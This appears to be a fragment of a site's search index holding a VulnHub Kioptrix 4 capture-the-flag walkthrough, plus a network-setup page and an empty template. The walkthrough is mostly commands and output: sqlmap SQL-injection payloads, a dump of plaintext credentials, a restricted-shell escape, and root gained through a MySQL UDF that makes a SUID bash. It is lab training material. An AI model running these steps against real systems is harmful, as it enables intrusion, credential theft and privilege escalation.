HTTP/1.1\nHost: 192.168.123.93\nContent-Length: 56\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.123.93\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://192.168.123.93/index.php?\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\nmyusername=admin&amp;mypassword=admin&amp;Submit=Login\n</code></pre> <pre><code>$ sqlmap -r post.txt --batch --level 5\n\nsqlmap identified the following injection point(s) with a total of 1464 HTTP(s) requests:\n---\nParameter: mypassword (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: myusername=admin&amp;mypassword=admin' AND 2376=(SELECT (CASE WHEN (2376=2376) THEN 2376 ELSE (SELECT 2392 UNION SELECT 5042) END))-- -&amp;Submit=Login\n\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: myusername=admin&amp;mypassword=admin' AND (SELECT 8032 FROM (SELECT(SLEEP(5)))RhUh)-- GqgT&amp;Submit=Login\n---\n</code></pre> <pre><code>$ sqlmap -r post.txt --batch --level 3 --dbs\navailable databases [3]:\n[*] information_schema\n[*] members\n[*] mysql\n\n$ sqlmap -r post.txt --batch --level 3 -D members --tables\nDatabase: members\n[1 table]\n+---------+\n| members |\n+---------+\n\n$ sqlmap -r post.txt --batch --level 3 -D members -T members --dump\nDatabase: members\nTable: members\n[2 entries]\n+----+-----------------------+----------+\n| id | password              | username |\n+----+-----------------------+----------+\n| 1  | MyNameIsJohn          | john     |\n| 2  | ADGAdsafdfwt4gadfga== | robert   |\n+----+-----------------------+----------+\n</code></pre> <ul> <li>login page ok, nothing special in html source code</li> <li>guess passwords also can login by ssh</li> </ul> <ul> <li>ssh login ok, <code>$ ssh -oHostKeyAlgorithms=ssh-rsa john@$IP</code></li> <li>get a restricted shell</li> </ul> <pre><code>john@192.168.123.93's password:\nWelcome to LigGoat Security Systems - We are Watching\n== Welcome LigGoat Employee ==\nLigGoat Shell is in place so you  don't screw up\nType '?' or 'help' to get the list of allowed commands\njohn:~$ ?\ncd  clear  echo  exit  help  ll  lpath  ls\njohn:~$\n\njohn:~$ ll\ntotal 0\njohn:~$ ls\njohn:~$ cd ..\n*** forbidden path -&gt; \"/home/\"\n*** You have 0 warning(s) left, before getting kicked out.\nThis incident has been reported.\njohn:~$ ls\njohn:~$ ll\ntotal 0\njohn:~$ lpath\nAllowed:\n /home/john\njohn:~$ echo a shell\na shell\njohn:~$ sudo -l\n*** forbidden sudo -&gt; sudo -l\njohn:~$\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#priv-esca","title":"priv-esca","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#bypass-restricted-shell","title":"bypass restricted shell","text":"<p>If the restricted shell is implemented by python, commands might be writted like:</p> <ul> <li>os.system()</li> <li>os.popen()</li> <li>subprocess.popen()</li> <li>subprocess.call()</li> <li>subprocess.run()</li> <li>subprocess.getstatusoutput()</li> </ul> <p>So, construct similar expression to execute unallowed commands on Linux:</p> <pre><code>john:~$ ls os.system('id')\nuid=1001(john) gid=1001(john) groups=1001(john)\nsh: Syntax error: \"(\" unexpected\njohn:~$ ls os.system('bash')\njohn@Kioptrix4:~$\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#enum","title":"enum","text":"<ul> <li>basic info of machine</li> </ul> <pre><code>john@Kioptrix4:~$ id\nuid=1001(john) gid=1001(john) groups=1001(john)\njohn@Kioptrix4:~$ ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:0c:29:a9:40:2b brd ff:ff:ff:ff:ff:ff\n    inet 192.168.123.93/24 brd 192.168.123.255 scope global eth1\njohn@Kioptrix4:~$ uname -a\nLinux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux\njohn@Kioptrix4:~$ cat /etc/*release\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=8.04\nDISTRIB_CODENAME=hardy\nDISTRIB_DESCRIPTION=\"Ubuntu 8.04.3 LTS\"\njohn@Kioptrix4:~$\n</code></pre> <ul> <li>sudo, suid, guid [x]</li> </ul> <pre><code>john@Kioptrix4:~$ sudo -l\n[sudo] password for john:\nSorry, user john may not run sudo on Kioptrix4.\njohn@Kioptrix4:~$ find / -type f -perm -u=s 2&gt;/dev/null\n/usr/lib/apache2/suexec\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/pt_chown\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/traceroute6.iputils\n/usr/bin/newgrp\n/usr/bin/sudoedit [x]\n/usr/bin/chfn\n/usr/bin/arping\n/usr/bin/gpasswd\n/usr/bin/mtr\n/usr/bin/passwd\n/usr/bin/at\n/usr/sbin/pppd\n/usr/sbin/uuidd\n/lib/dhcp3-client/call-dhclient-script\n/bin/mount\n/bin/ping6\n/bin/fusermount\n/bin/su\n/bin/ping\n/bin/umount\n/sbin/umount.cifs\n/sbin/mount.cifs\n</code></pre> <ul> <li>crontab [x]</li> <li>kernel priv esca (not tried)</li> </ul> <pre><code>$ searchsploit linux kernel ubuntu 2.6.24 Priv\nLinux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - 'set_selection()' UTF-8 Off-by-One Privi | linux_x86-64/local/9083.c\nLinux Kernel &lt; 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation (1)                                            | linux_x86/local/15916.c\nLinux Kernel &lt; 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privilege Escalation (2)                                        | linux/local/15944.c\nLinux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation                                             | linux/local/14814.c\nLinux Kernel &lt; 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Escalation                                                 | linux/local/17787.c\nLinux Kernel &lt; 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation                                              | linux_x86-64/local/34134.c\nLinux Kernel &lt; 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalation                                    | linux_x86-64/local/44299.c\nLinux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                        | linux/local/45010.c\nLinux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                               | linux/local/44298.c\nLinux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                    | linux_x86-64/local/44300.c\nLinux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                | linux/local/43418.c\nLinux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)            | linux/local/47169.c\n</code></pre> <ul> <li>process, listen-state port</li> <li><code>$ ps -ef | grep mysql</code></li> <li><code>netstat -tunlp</code></li> <li>find mysql availabe, root priv</li> </ul> <pre><code>john@Kioptrix4:~$ ps -ef | grep mysql\nroot      5137     1  0 15:02 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe\nroot      5179  5137  0 15:02 ?        00:00:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-exter\nroot      5180  5137  0 15:02 ?        00:00:00 logger -p daemon.err -t mysqld_safe -i -t mysqld\njohn      5449  5412  0 15:59 pts/0    00:00:00 grep mysql\njohn@Kioptrix4:~$ netstat -tunlp\n(No info could be read for \"-p\": geteuid()=1001 but you should be root.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -\nudp        0      0 192.168.123.93:137      0.0.0.0:*                           -\nudp        0      0 0.0.0.0:137             0.0.0.0:*                           -\nudp        0      0 192.168.123.93:138      0.0.0.0:*                           -\nudp        0      0 0.0.0.0:138             0.0.0.0:*                           -\nudp        0      0 0.0.0.0:68              0.0.0.0:*                           -\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#mysql-udf","title":"mysql - udf","text":"<ul> <li>validate lib_mysqludf_sys.so file</li> <li>validate usefull config: secure_file_priv</li> </ul> <pre><code>robert@Kioptrix4:/$ whereis lib_mysqludf_sys.so\nlib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so\nrobert@Kioptrix4:/$ # mysql udf installed: yes\nrobert@Kioptrix4:/$ mysql -u root\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 34526\nServer version: 5.0.51a-3ubuntu5.4 (Ubuntu)\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the buffer.\n\nmysql&gt; show global variables like '%secure%';\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_auth      | OFF   |\n| secure_file_priv |       |\n+------------------+-------+\n2 rows in set (0.00 sec)\n\nmysql&gt; select @@version;\n+--------------------+\n| @@version          |\n+--------------------+\n| 5.0.51a-3ubuntu5.4 |\n+--------------------+\n1 row in set (0.00 sec)\n</code></pre> <ul> <li>create udf: sys_eval by lib_mysqludf_sys.so</li> <li>copy bash shell into /tmp dir, set suid to /tmp/rbash</li> </ul> <pre><code>mysql&gt; use mysql;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql&gt; create function sys_eval returns string soname 'lib_mysqludf_sys.so';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; select sys_eval('id');\n+--------------------------+\n| sys_eval('id')           |\n+--------------------------+\n| uid=0(root) gid=0(root)\n |\n+--------------------------+\n1 row in set (0.00 sec)\n\nmysql&gt; select sys_eval('cp /bin/bash /tmp/rbash; chmod +xs /tmp/rbash');\n+-----------------------------------------------------------+\n| sys_eval('cp /bin/bash /tmp/rbash; chmod +xs /tmp/rbash') |\n+-----------------------------------------------------------+\n|                                                           |\n+---------------------------------------\n</code></pre> <ul> <li>run rbash on privileged mode -&gt; get root</li> </ul> <pre><code>robert@Kioptrix4:/tmp$ ls\nrbash\nrobert@Kioptrix4:/tmp$ ./rbash -p\nrbash-3.2# id\nuid=1002(robert) gid=1002(robert) euid=0(root) egid=0(root) groups=1002(robert)\nrbash-3.2# ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:0c:29:a9:40:2b brd ff:ff:ff:ff:ff:ff\n    inet 192.168.123.93/24 brd 192.168.123.255 scope global eth1\nrbash-3.2# uname -a\nLinux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux\nrbash-3.2$ cat congrats.txt\nCongratulations!\nYou've got root.\n\nThere is more then one way to get root on this system. Try and find them.\nI've only tested two (2) methods, but it doesn't mean there aren't more.\nAs always there's an easy way, and a not so easy way to pop this box.\nLook for other methods to get root privileges other than running an exploit.\n\nIt took a while to make this. For one it's not as easy as it may look, and\nalso work and family life are my priorities. Hobbies are low on my list.\nReally hope you enjoyed this one.\n\nIf you haven't already, check out the other VMs available on:\nwww.kioptrix.com\n\nThanks for playing,\nloneferret\n</code></pre> <ul> <li>If no <code>lib_mysqludf_sys.so</code> exists, use this exp method: <code>$ searchsploit udf 5.0 -m 1518</code></li> </ul> <pre><code>$ searchsploit udf 5.0\n------------------------------------------------ ---------------------------------\n Exploit Title                                  |  Path\n------------------------------------------------ ---------------------------------\nMySQL 4.x/5.0 (Linux) - User-Defined Function ( | linux/local/1518.c\nMySQL 4.x/5.0 (Windows) - User-Defined Function | windows/remote/3274.txt\n------------------------------------------------ ---------------------------------\nShellcodes: No Results\n\n * Usage:\n * $ id\n * uid=500(raptor) gid=500(raptor) groups=500(raptor)\n * $ gcc -g -c raptor_udf2.c\n * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n * $ mysql -u root -p\n * Enter password:\n * [...]\n * mysql&gt; use mysql;\n * mysql&gt; create table foo(line blob);\n * mysql&gt; insert into foo values(load_file('/home/raptor/raptor_udf2.so'));\n * mysql&gt; select * from foo into dumpfile '/usr/lib/raptor_udf2.so';\n * mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';\n * mysql&gt; select * from mysql.func;\n * +-----------+-----+----------------+----------+\n * | name      | ret | dl             | type     |\n * +-----------+-----+----------------+----------+\n * | do_system |   2 | raptor_udf2.so | function |\n * +-----------+-----+----------------+----------+\n * mysql&gt; select do_system('id &gt; /tmp/out; chown raptor.raptor /tmp/out');\n * mysql&gt; \\! sh\n * sh-2.05b$ cat /tmp/out\n * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\n</code></pre>"},{"location":"Write-ups/vulnhub/network-config/","title":"Network Config","text":""},{"location":"Write-ups/vulnhub/network-config/#env","title":"ENV","text":"<ul> <li>wsl2 - kali linux</li> <li>vmware workstation - machines</li> </ul>"},{"location":"Write-ups/vulnhub/network-config/#network","title":"Network","text":"<p>all connect to WLAN</p> <ul> <li>for wsl2</li> </ul> <pre><code># on win\nGet-NetAdapter\nSet-VMSwitch WSL -NetAdapterName WLAN\n\n# on kali\nsudo ip addr del $(ip addr show eth0 | grep 'inet\\b' | awk '{print $2}' | head -n 1) dev eth0\nsudo ip addr add 192.168.1.99/24 broadcast 192.168.1.255 dev eth0\nsudo ip route add 0.0.0.0/0 via 192.168.1.1 dev eth0\n</code></pre> <ul> <li>for vmware, bridge mode (same adapter of wsl2)</li> </ul>"},{"location":"Write-ups/vulnhub/network-config/#wsl2-bridge-config","title":"wsl2 bridge config","text":"<p>instead of changing ip addr using ip command, change config file of wsl2 on windows:</p> <pre><code>[wsl2]\nprocessors=4\nmemory=8GB\nswap=0\n\n[wsl2]\nnetworkingMode=bridged\nvmSwitch=WSL\nipv6=true\n</code></pre>"},{"location":"Write-ups/vulnhub/template/","title":"Template","text":""},{"location":"Write-ups/vulnhub/template/#machine-info","title":"Machine Info","text":""},{"location":"Write-ups/vulnhub/template/#pwk","title":"PWK","text":""},{"location":"Write-ups/vulnhub/template/#recon","title":"recon","text":""},{"location":"Write-ups/vulnhub/template/#exploit","title":"exploit","text":""},{"location":"Write-ups/vulnhub/template/#priv-esc","title":"priv-esc","text":""}]}